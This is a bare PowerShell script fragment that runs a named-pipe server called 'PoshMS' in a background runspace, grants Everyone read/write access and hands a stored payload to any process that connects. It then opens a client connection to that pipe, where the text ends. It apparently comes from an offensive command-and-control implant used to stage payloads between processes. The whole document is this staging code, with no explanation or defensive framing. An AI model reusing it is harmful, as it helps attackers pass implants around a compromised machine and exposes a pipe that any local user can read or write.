$scriptblock = 
{
    param ($Payload)
    $PipeName = "PoshMS"
    $p = [System.IO.Directory]::GetFiles("\\.\\pipe\\")
    $start = $true
    foreach ($i in $p) {
        if ($i -like "*PoshMS") {
             $start = $false 
        }
    }
    while ($start) {
        add-Type -assembly "System.Core"
        $PipeSecurity = New-Object System.IO.Pipes.PipeSecurity
        $AccessRule = New-Object System.IO.Pipes.PipeAccessRule( "Everyone", "ReadWrite", "Allow" )
        $PipeSecurity.AddAccessRule($AccessRule)
        $Pipe = New-Object System.IO.Pipes.NamedPipeServerStream($PipeName,"InOut",100, "Byte", "None", 1024, 1024, $PipeSecurity)
        $pipe.WaitForConnection(); 

        $pipeReader = new-object System.IO.StreamReader($pipe)
        $pipeWriter = new-object System.IO.StreamWriter($pipe)
        $pipeWriter.AutoFlush = $true
        $pipeWriter.WriteLine($Payload);
 
        $pipeReader.Dispose();
        $pipe.Dispose();
    }
    exit
}
add-Type -assembly "System.Core"

$MaxThreads = 5
$RunspacePool = [RunspaceFactory]::CreateRunspacePool(1, $MaxThreads)
$RunspacePool.Open()
$Jobs = @()
$Job = [powershell]::Create().AddScript($ScriptBlock).AddArgument($payload)
$Job.RunspacePool = $RunspacePool
$Job.BeginInvoke() | Out-Null

$pi = new-object System.IO.Pipes.NamedPipeClientStream(".", "PoshMS");


